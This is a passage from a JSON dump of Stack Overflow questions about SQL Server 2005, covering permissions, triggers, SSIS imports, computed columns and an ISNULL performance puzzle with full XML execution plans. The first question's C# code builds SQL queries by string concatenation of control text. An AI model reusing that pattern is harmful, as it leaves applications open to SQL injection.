and original price //\n        Label lblitemid = e.Item.FindControl(\"itemID\") as Label;\n        decimal strOP;\n        decimal strSP;\n        string salequery = \"select SaleItemNo, OriginalPrice, SalePrice, OriginalPriceRange, SalePriceRange from SaleItems where CatalogItemId='\" + lblitemid.Text + \"'\";\n        SqlConnection myconnection1 = new SqlConnection(ConfigurationManager.ConnectionStrings[\"DBconnection\"].ConnectionString);\n        SqlCommand SqlCmd1 = null;\n        SqlCmd1 = new SqlCommand(salequery, myconnection1);\n        SqlDataAdapter ad1 = new SqlDataAdapter(SqlCmd1);\n        DataTable dt1 = new DataTable();\n        ad1.Fill(dt1);\n\n        Label lbloriprice = e.Item.FindControl(\"originalprice\") as Label;\n        if (dt1.Rows[0][\"OriginalPrice\"].ToString() == \"\" || dt1.Rows[0][\"OriginalPrice\"].ToString() == \"0.00\")\n        {\n            lbloriprice.Attributes.Add(\"style\", \"display:none\");\n        }\n        else\n        {\n            strOP = Convert.ToDecimal(dt1.Rows[0][\"OriginalPrice\"].ToString());\n            lbloriprice.Text = strOP.ToString(\"c\");\n        }\n\n        Label lbloprange = e.Item.FindControl(\"opRange\") as Label;\n        if (dt1.Rows[0][\"OriginalPriceRange\"].ToString() != \"\")\n        {\n            lbloprange.Text = dt1.Rows[0][\"OriginalPriceRange\"].ToString();\n            lbloprange.Visible = true;\n            lbloriprice.Visible = false;\n        }\n\n        Label lblsaleprice = e.Item.FindControl(\"saleprice\") as Label;\n        if (dt1.Rows[0][\"SalePrice\"].ToString() == \"\" || dt1.Rows[0][\"SalePrice\"].ToString() == \"0.00\")\n        {\n            lblsaleprice.Attributes.Add(\"style\", \"display:none\");\n        }\n        else if (dt1.Rows[0][\"SalePriceRange\"].ToString() != \"\")\n        {\n            lblsaleprice.Text = \"Special &lt;br /&gt;\" + dt1.Rows[0][\"SalePriceRange\"].ToString();\n        }\n        else\n        {\n            strSP = Convert.ToDecimal(dt1.Rows[0][\"SalePrice\"].ToString());\n            lblsaleprice.Text = \"Special &lt;br /&gt;\" + strSP.ToString(\"c\");\n        }\n\n    }\n\n    #endregion\n</code></pre>\n\n<p>It's throwing errors on ad1.fill(dt1)</p>\n\n<p>I redesigned my code and was wondering if this will reduce or remove the errors. Please advice</p>\n\n<pre><code>   #region repeater item databound\n    protected void rProducts_OnItemDataBound(object source, RepeaterItemEventArgs e)\n    {\n\n        // displaying sale and original price //\n        Label lblitemid = e.Item.FindControl(\"itemID\") as Label;\n\n        SqlDataSource SqlDataSource2 = new SqlDataSource();\n        SqlDataSource2.ID = \"SqlDataSource2\";\n        SqlDataSource2.ConnectionString = ConfigurationManager.ConnectionStrings[\"DBconnection\"].ConnectionString;\n        SqlDataSource2.SelectCommand = \"select SaleItemNo, OriginalPrice, SalePrice, OriginalPriceRange, SalePriceRange from SaleItems where CatalogItemId='\" + lblitemid.Text + \"'\";\n\n        Repeater rep = e.Item.FindControl(\"rpt2\") as Repeater;\n        rep.DataSource = SqlDataSource2;\n        rep.DataBind();\n\n     }\n#endregion\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":22,"score":2,"question_id":13087699,"title":"computed column or indexed view?","body":"<p>I have a column part # that can contain many non-alphanumeric characters.  I frequently need to compare part #'s from customers or vendors to our data.  I've been doing this successfully with a user-defined function that returns only alpha-Numeric.  I improved performance by creating a computed column called stripPartNum on an indexed view.  I would like to move this computed column to the table.</p>\n\n<p>I cannot create the computed column as persisted so I can create an index on the column.<br>\nError:\nComputed column 'stripPartNum' in table 'inventory' cannot be persisted because the column is non-deterministic.</p>\n\n<p>I created a new user-defined function not using patIndex, but still have the same problem.\nHere is the function:</p>\n\n<pre><code>Create FUNCTION [dbo].[anOnly]\n(\n@string VARCHAR(900)\n)\nRETURNS VARCHAR(900)\n\nAS\nBEGIN\n\nDeclare @pos int,@newString varchar(1000),@charAt char(1)\nSet @pos = 0\nSet @newString = ''\n\nwhile @pos &lt;= len(@string)\n    begin\n    Set @charAt = substring(@string,@pos,1)\n    if @charAt not like '[^0-9A-Za-z]'\n        Set @newString = @newString + @charAt\n    Set @pos = @pos + 1\n    end\n\nreturn @newString\nEND\n</code></pre>\n\n<p>Why am I able to create an index on the computed column in the view but not on the table?  Is there a solution I am overlooking?</p>\n"},{"tags":["sql-server","sql-server-2005","permissions","login","user"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":9513,"score":0,"question_id":372834,"title":"Permissions required for 'CREATE USER' in SQL Server 2005?","body":"<p>I am trying to create a SQL server login and database user from within my application, along with a custom application user row. I want these users to be able to create other users - i.e. the application will control who can/can't create users but I need all users to have permissions for creating SQL server logins and database users.</p>\n\n<p>I have got the server login permissions working - i.e. an existing user/login can create a new login - by adding the logins to the 'securityadmin' server role - which grants the 'ALTER ANY LOGIN' privilege. </p>\n\n<p>I tried to do the same with the database users - adding them to the 'db_accessadmin' database role - which supposedly grants the ALTER ANY USER privilege, which is required for CREATE USER. </p>\n\n<p>However any time I try to create a new database user using a user with the above privileges I get a permissions exception.</p>\n\n<p>I have tried manually granting the ALTER ANY USER permission to a particular user (GRANT ALTER ANY USER TO demouser) but this doesn't work either.</p>\n\n<p>Any ideas about what I am missing here? </p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql-server-2005","tsql"],"answer_count":7,"favorite_count":3,"up_vote_count":19,"down_vote_count":0,"view_count":47073,"score":19,"question_id":1256915,"title":"Remove the last character in a string in T-SQL?","body":"<p>How do I remove the last character in a string in T-SQL?</p>\n\n<p>I.E. \n'TEST STRING'</p>\n\n<p>to return:</p>\n\n<p>'TEST STRIN'</p>\n\n<p>thanks\nDave</p>\n"},{"tags":["c#","sql-server-2005","rabbitmq"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":58,"score":5,"question_id":13087058,"title":"Consuming SQL Server data events for messaging purposes","body":"<p>At our organization we have a SQL Server 2005 database and a fair number of database clients: web sites (php, zope, asp.net), rich clients (legacy fox pro). Now we need to pass certain events from the core database with other systems (MongoDb, LDAP and others). Messaging paradigm seems pretty capable of solving this kind of problem. So we decided to use RabbitMQ broker as a middleware.</p>\n\n<p>The problem of consuming events from the database at first seemed to have only two possible solutions:</p>\n\n<ol>\n<li>Poll the database for outgoing messages and pass them to a message broker. </li>\n<li>Use triggers on certain tables to pass messages to a broker on the same machine.</li>\n</ol>\n\n<p>I disliked the first idea due to latency issues which arise when periodical execution of sql is involved. </p>\n\n<p>But event-based trigger approach has a problem which seems unsolvable to me at the moment. Consider this scenario:</p>\n\n<ol>\n<li>A row is inserted into a table.</li>\n<li>Trigger fires and sends a message (using a CLR Stored Procedure written in C#)</li>\n</ol>\n\n<p>Everything is ok unless transaction which writes data is rolled back. In this case data will be consistent, but the message has already been sent and cannot be rolled back because trigger fires at the moment of writing to the database log, not at the time of transaction commit (which is a correct behaviour of a RDBMS).</p>\n\n<p>I realize now that I'm asking too much of triggers and they are not suitable for tasks other than working with data.</p>\n\n<p>So my questions are:</p>\n\n<ol>\n<li>Has anyone managed to extract data events using triggers?</li>\n<li>What other methods of consuming data events can you advise?</li>\n<li>Is Query Notification (built on top of Service Broker) suitable in my situation?</li>\n</ol>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","count"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":28,"score":1,"question_id":13080925,"title":"Counting frequency of values assigned to different types","body":"<p>I apologize in advance for my poor description, I couldn't think of a way to word it better, but I'll try to explain it thoroughly.</p>\n\n<p>Let's say that I have a table setup in this manner:</p>\n\n<h2>Input Table</h2>\n\n<pre><code>Itm Type\nA   Apple\nB   Orange\nC   Apple\nB   Grape\nD   Peaches\nB   Apple\nC   Grapes\nE   Apple\nA   Apple\n</code></pre>\n\n<p>The goal is to produce a table showing each item (A, B, C, D, and E) with the total number of each type that was assigned to that item.</p>\n\n<h2>Goal Output Table</h2>\n\n<pre><code>Itm    Apple  Orange  Grape  Peaches    \nA       2       0       0       0   \nB       1       1       1       0\nC       1       0       1       0\nD       0       0       0       1\nE       1       0       0       0\n</code></pre>\n\n<p>The query I'm using now displays a table where it seems to be summing up all of the types for all of the items and placing that value on each row.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13082595,"title":"T-SQL: How to deny update on one column of a table via trigger?","body":"<p>Question: <br />\nIn our SQL-Server 2005 database, we have a table T_Groups.<br />\nT_Groups has, amongst other things, the fields ID (PK) and Name.</p>\n\n<p>Now some idiot in our company used the name as key in a mapping table...<br />\nWhich means now one may not alter a group name, because if one does, the mapping is gone...\n<br />\nNow, until this is resolved, I need to add a restriction to T_Groups, so one can't update the group's name. <br />\nNote that insert should still be possible, and an update that doesn't change the groupname should also be possible.<br /></p>\n\n<p>Also note that the user of the application &amp; the developers have both dbo and sysadmin rights, so REVOKE/DENY won't work.\n<br /><br />\nHow can I do this with a trigger ?</p>\n"},{"tags":["sql-server","sql-server-2005","ssis","csv","import"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":8094,"score":4,"question_id":89372,"title":"How to import variable record length CSV file using SSIS?","body":"<p>Has anyone been able to get a variable record length text file (CSV) into SQL Server via SSIS?</p>\n\n<p>I have tried time and again to get a CSV file into a SQL Server table, using SSIS, where the input file has varying record lengths.  For this question, the two different record lengths are 63 and 326 bytes.   All record lengths will be imported into the same 326 byte width table.</p>\n\n<p>There are over 1 million records to import.<br />\nI have no control of the creation of the import file.<br />\nI must use SSIS.<br />\nI have confirmed with MS that this has been reported as a bug.\nI have tried several workarounds.  Most have been where I try to write custom code to intercept the record and I cant seem to get that to work as I want.</p>\n"},{"tags":["sql-server","sql-server-2005","ddl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":632,"score":2,"question_id":7956620,"title":"Do statistics referencing a column prevent that column from being dropped?","body":"<p>I'm trying a very simple <code>drop column</code> statement:</p>\n\n<pre><code>alter table MyTable drop column MyColumn\n</code></pre>\n\n<p>and receiving several errors along the lines of</p>\n\n<blockquote>\n  <p>Msg 5074, Level 16, State 1, Line 1<br>\n  The statistics '_dta_stat_1268251623_3_2' is dependent on column 'MyColumn'.</p>\n</blockquote>\n\n<p>followed ultimately by</p>\n\n<blockquote>\n  <p>Msg 4922, Level 16, State 9, Line 1<br>\n  ALTER TABLE DROP COLUMN MyColumn failed because one or more objects access this column.</p>\n</blockquote>\n\n<p>I didn't think statistics prevent a column from being dropped. Do they? If so, since these are apparently auto-created statistics I can't depend on the names being the same across multiple copies of the same database, so how could I drop all such statistics in an upgrade script to be executed on a different database?</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3255,"score":0,"question_id":2448714,"title":"Getting average from 3 columns in SQL Server","body":"<p>I have a table with 3 columns (<code>smallint</code>) in SQL Server 2005.</p>\n\n<pre><code>Table Ratings\nratin1 smallint,\nratin2 smallint\nratin3 smallint\n</code></pre>\n\n<p>These columns can have values from <code>0</code> to <code>5</code>.</p>\n\n<p>How can I select the average value of these fields, but only compare fields where the value is greater then <code>0</code>.</p>\n\n<p>So if the column values are <code>1</code>, <code>3</code> ,<code>5</code> - the average has to be <code>3</code>.\nif the values are <code>0</code>, <code>3</code>, <code>5</code> - The average has to be <code>4</code>.</p>\n"},{"tags":["performance","query","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":12854990,"title":"Why would ISNULL improve the performance of a query?","body":"<p>We're currently trying to speedup some queries and we've run into something which I (not a DBA just a .NET developer) cannot explain or comprehent. We're running this query on SQL Server 2005.</p>\n\n<p>We have the following query (made small and simple for the sake of argument);</p>\n\n<pre><code>SELECT    \n    *\nFROM    \n    RandomTable \nWHERE   \n    MoneyColumn &lt;&gt; 0\nGROUP BY\n    SomeColumn\n</code></pre>\n\n<p>This query run in around <strong>three</strong> seconds, then we randomly tried to following to speed it up (shot in the dark really)</p>\n\n<pre><code>SELECT    \n    *\nFROM    \n    RandomTable \nWHERE   \n    isnull(MoneyColumn,0) &lt;&gt; 0\nGROUP BY\n    SomeColumn\n</code></pre>\n\n<p>This reduces the query speed to around <strong>one</strong> second..</p>\n\n<p>This column has no NULL values (yet due to the database design beeing HORRIBLE) it is however NULLABLE...</p>\n\n<p>Is the fact that it's NULLABLE making SQL Server do something to account for this making it slow where the ISNULL isn't beeing mentioned? I simply have no idea why the ISNULL would make it perform faster (and by such a big margin). I'd think SQL would actually have more to do when there is a ISNULL statement in the query.</p>\n\n<p>Can anyone shed some light on this?</p>\n\n<p><strong>EDIT</strong> Execution plans added</p>\n\n<p><strong>With ISNULL</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-16\"?&gt;\n&lt;ShowPlanXML xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Version=\"1.0\" Build=\"9.00.5000.00\" xmlns=\"http://schemas.microsoft.com/sqlserver/2004/07/showplan\"&gt;\n  &lt;BatchSequence&gt;\n    &lt;Batch&gt;\n      &lt;Statements&gt;\n        &lt;StmtSimple StatementCompId=\"1\" StatementEstRows=\"9019.76\" StatementId=\"1\" StatementOptmLevel=\"FULL\" StatementSubTreeCost=\"1.48105\" StatementText=\"SELECT    debiteur_id, MIN(Faktuurdatum) AS OldestOpenInvoiceDate, ISNULL(SUM(Totaal_Open),0) AS TotalOpenAmount&amp;#xD;&amp;#xA;FROM    dbo.tbl_Faktuur &amp;#xD;&amp;#xA;WHERE   (Afgehandeld_NeeJa = 0 OR Afgehandeld_NeeJa IS NULL)&amp;#xD;&amp;#xA;AND        (ISNULL(Totaal_Open,0) &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;--AND        (Totaal_Open &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;GROUP BY debiteur_id\" StatementType=\"SELECT\"&gt;\n          &lt;StatementSetOptions ANSI_NULLS=\"false\" ANSI_PADDING=\"false\" ANSI_WARNINGS=\"false\" ARITHABORT=\"true\" CONCAT_NULL_YIELDS_NULL=\"false\" NUMERIC_ROUNDABORT=\"false\" QUOTED_IDENTIFIER=\"false\" /&gt;\n          &lt;QueryPlan DegreeOfParallelism=\"1\" MemoryGrant=\"1520\" CachedPlanSize=\"54\" CompileTime=\"11\" CompileCPU=\"11\" CompileMemory=\"704\"&gt;\n            &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.000901976\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"9019.76\" LogicalOp=\"Compute Scalar\" NodeId=\"0\" Parallel=\"false\" PhysicalOp=\"Compute Scalar\" EstimatedTotalSubtreeCost=\"1.48105\"&gt;\n              &lt;OutputList&gt;\n                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                &lt;ColumnReference Column=\"Expr1005\" /&gt;\n              &lt;/OutputList&gt;\n              &lt;ComputeScalar&gt;\n                &lt;DefinedValues&gt;\n                  &lt;DefinedValue&gt;\n                    &lt;ColumnReference Column=\"Expr1005\" /&gt;\n                    &lt;ScalarOperator ScalarString=\"isnull([Expr1004],($0.0000))\"&gt;\n                      &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Identifier&gt;\n                            &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                          &lt;/Identifier&gt;\n                        &lt;/ScalarOperator&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/Intrinsic&gt;\n                    &lt;/ScalarOperator&gt;\n                  &lt;/DefinedValue&gt;\n                &lt;/DefinedValues&gt;\n                &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.291662\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"9019.76\" LogicalOp=\"Compute Scalar\" NodeId=\"1\" Parallel=\"false\" PhysicalOp=\"Compute Scalar\" EstimatedTotalSubtreeCost=\"1.48014\"&gt;\n                  &lt;OutputList&gt;\n                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                  &lt;/OutputList&gt;\n                  &lt;ComputeScalar&gt;\n                    &lt;DefinedValues&gt;\n                      &lt;DefinedValue&gt;\n                        &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                        &lt;ScalarOperator ScalarString=\"CASE WHEN [Expr1013]=(0) THEN NULL ELSE [Expr1014] END\"&gt;\n                          &lt;IF&gt;\n                            &lt;Condition&gt;\n                              &lt;ScalarOperator&gt;\n                                &lt;Compare CompareOp=\"EQ\"&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Identifier&gt;\n                                      &lt;ColumnReference Column=\"Expr1013\" /&gt;\n                                    &lt;/Identifier&gt;\n                                  &lt;/ScalarOperator&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Const ConstValue=\"(0)\" /&gt;\n                                  &lt;/ScalarOperator&gt;\n                                &lt;/Compare&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Condition&gt;\n                            &lt;Then&gt;\n                              &lt;ScalarOperator&gt;\n                                &lt;Const ConstValue=\"NULL\" /&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Then&gt;\n                            &lt;Else&gt;\n                              &lt;ScalarOperator&gt;\n                                &lt;Identifier&gt;\n                                  &lt;ColumnReference Column=\"Expr1014\" /&gt;\n                                &lt;/Identifier&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Else&gt;\n                          &lt;/IF&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/DefinedValue&gt;\n                    &lt;/DefinedValues&gt;\n                    &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.291662\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"9019.76\" LogicalOp=\"Aggregate\" NodeId=\"2\" Parallel=\"false\" PhysicalOp=\"Hash Match\" EstimatedTotalSubtreeCost=\"1.48014\"&gt;\n                      &lt;OutputList&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                        &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                        &lt;ColumnReference Column=\"Expr1013\" /&gt;\n                        &lt;ColumnReference Column=\"Expr1014\" /&gt;\n                      &lt;/OutputList&gt;\n                      &lt;MemoryFractions Input=\"1\" Output=\"1\" /&gt;\n                      &lt;RunTimeInformation&gt;\n                        &lt;RunTimeCountersPerThread Thread=\"0\" ActualRows=\"156794\" ActualEndOfScans=\"1\" ActualExecutions=\"1\" /&gt;\n                      &lt;/RunTimeInformation&gt;\n                      &lt;Hash&gt;\n                        &lt;DefinedValues&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                            &lt;ScalarOperator ScalarString=\"MIN([directpay].[dbo].[tbl_Faktuur].[Faktuurdatum])\"&gt;\n                              &lt;Aggregate AggType=\"MIN\" Distinct=\"false\"&gt;\n                                &lt;ScalarOperator&gt;\n                                  &lt;Identifier&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                                  &lt;/Identifier&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/Aggregate&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Column=\"Expr1013\" /&gt;\n                            &lt;ScalarOperator ScalarString=\"COUNT_BIG([directpay].[dbo].[tbl_Faktuur].[Totaal_Open])\"&gt;\n                              &lt;Aggregate AggType=\"COUNT_BIG\" Distinct=\"false\"&gt;\n                                &lt;ScalarOperator&gt;\n                                  &lt;Identifier&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                  &lt;/Identifier&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/Aggregate&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Column=\"Expr1014\" /&gt;\n                            &lt;ScalarOperator ScalarString=\"SUM([directpay].[dbo].[tbl_Faktuur].[Totaal_Open])\"&gt;\n                              &lt;Aggregate AggType=\"SUM\" Distinct=\"false\"&gt;\n                                &lt;ScalarOperator&gt;\n                                  &lt;Identifier&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                  &lt;/Identifier&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/Aggregate&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/DefinedValue&gt;\n                        &lt;/DefinedValues&gt;\n                        &lt;HashKeysBuild&gt;\n                          &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                        &lt;/HashKeysBuild&gt;\n                        &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.255\" EstimateIO=\"0.634196\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"27420\" LogicalOp=\"Index Seek\" NodeId=\"4\" Parallel=\"false\" PhysicalOp=\"Index Seek\" EstimatedTotalSubtreeCost=\"0.889196\"&gt;\n                          &lt;OutputList&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                          &lt;/OutputList&gt;\n                          &lt;RunTimeInformation&gt;\n                            &lt;RunTimeCountersPerThread Thread=\"0\" ActualRows=\"298726\" ActualEndOfScans=\"1\" ActualExecutions=\"1\" /&gt;\n                          &lt;/RunTimeInformation&gt;\n                          &lt;IndexScan Ordered=\"true\" ScanDirection=\"FORWARD\" ForcedIndex=\"false\" NoExpandHint=\"false\"&gt;\n                            &lt;DefinedValues&gt;\n                              &lt;DefinedValue&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                              &lt;/DefinedValue&gt;\n                              &lt;DefinedValue&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                              &lt;/DefinedValue&gt;\n                              &lt;DefinedValue&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/DefinedValue&gt;\n                            &lt;/DefinedValues&gt;\n                            &lt;Object Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Index=\"[_dta_index_tbl_Faktuur_5_583009158__K13_K9_K19_K2_5]\" /&gt;\n                            &lt;SeekPredicates&gt;\n                              &lt;SeekPredicate&gt;\n                                &lt;Prefix ScanType=\"EQ\"&gt;\n                                  &lt;RangeColumns&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Afgehandeld_NeeJa\" /&gt;\n                                  &lt;/RangeColumns&gt;\n                                  &lt;RangeExpressions&gt;\n                                    &lt;ScalarOperator ScalarString=\"(0)\"&gt;\n                                      &lt;Const ConstValue=\"(0)\" /&gt;\n                                    &lt;/ScalarOperator&gt;\n                                  &lt;/RangeExpressions&gt;\n                                &lt;/Prefix&gt;\n                              &lt;/SeekPredicate&gt;\n                            &lt;/SeekPredicates&gt;\n                            &lt;Predicate&gt;\n                              &lt;ScalarOperator ScalarString=\"isnull([directpay].[dbo].[tbl_Faktuur].[Totaal_Open],($0.0000))&amp;lt;($0.0000) OR isnull([directpay].[dbo].[tbl_Faktuur].[Totaal_Open],($0.0000))&amp;gt;($0.0000)\"&gt;\n                                &lt;Logical Operation=\"OR\"&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Compare CompareOp=\"LT\"&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Identifier&gt;\n                                              &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                            &lt;/Identifier&gt;\n                                          &lt;/ScalarOperator&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                          &lt;/ScalarOperator&gt;\n                                        &lt;/Intrinsic&gt;\n                                      &lt;/ScalarOperator&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                      &lt;/ScalarOperator&gt;\n                                    &lt;/Compare&gt;\n                                  &lt;/ScalarOperator&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Compare CompareOp=\"GT\"&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Identifier&gt;\n                                              &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                            &lt;/Identifier&gt;\n                                          &lt;/ScalarOperator&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                          &lt;/ScalarOperator&gt;\n                                        &lt;/Intrinsic&gt;\n                                      &lt;/ScalarOperator&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                      &lt;/ScalarOperator&gt;\n                                    &lt;/Compare&gt;\n                                  &lt;/ScalarOperator&gt;\n                                &lt;/Logical&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Predicate&gt;\n                          &lt;/IndexScan&gt;\n                        &lt;/RelOp&gt;\n                      &lt;/Hash&gt;\n                    &lt;/RelOp&gt;\n                  &lt;/ComputeScalar&gt;\n                &lt;/RelOp&gt;\n              &lt;/ComputeScalar&gt;\n            &lt;/RelOp&gt;\n          &lt;/QueryPlan&gt;\n        &lt;/StmtSimple&gt;\n      &lt;/Statements&gt;\n    &lt;/Batch&gt;\n  &lt;/BatchSequence&gt;\n&lt;/ShowPlanXML&gt;\n</code></pre>\n\n<p><strong>Without ISNULL</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-16\"?&gt;\n&lt;ShowPlanXML xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Version=\"1.0\" Build=\"9.00.5000.00\" xmlns=\"http://schemas.microsoft.com/sqlserver/2004/07/showplan\"&gt;\n  &lt;BatchSequence&gt;\n    &lt;Batch&gt;\n      &lt;Statements&gt;\n        &lt;StmtSimple StatementCompId=\"1\" StatementEstRows=\"1322.43\" StatementId=\"1\" StatementOptmLevel=\"FULL\" StatementOptmEarlyAbortReason=\"GoodEnoughPlanFound\" StatementSubTreeCost=\"0.274954\" StatementText=\"SELECT    debiteur_id, MIN(Faktuurdatum) AS OldestOpenInvoiceDate, ISNULL(SUM(Totaal_Open),0) AS TotalOpenAmount&amp;#xD;&amp;#xA;FROM    dbo.tbl_Faktuur &amp;#xD;&amp;#xA;WHERE   (Afgehandeld_NeeJa = 0 OR Afgehandeld_NeeJa IS NULL)&amp;#xD;&amp;#xA;--AND        (ISNULL(Totaal_Open,0) &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;AND        (Totaal_Open &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;GROUP BY debiteur_id\" StatementType=\"SELECT\"&gt;\n          &lt;StatementSetOptions ANSI_NULLS=\"false\" ANSI_PADDING=\"false\" ANSI_WARNINGS=\"false\" ARITHABORT=\"true\" CONCAT_NULL_YIELDS_NULL=\"false\" NUMERIC_ROUNDABORT=\"false\" QUOTED_IDENTIFIER=\"false\" /&gt;\n          &lt;QueryPlan CachedPlanSize=\"47\" CompileTime=\"9\" CompileCPU=\"9\" CompileMemory=\"528\"&gt;\n            &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.000132243\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"1322.43\" LogicalOp=\"Compute 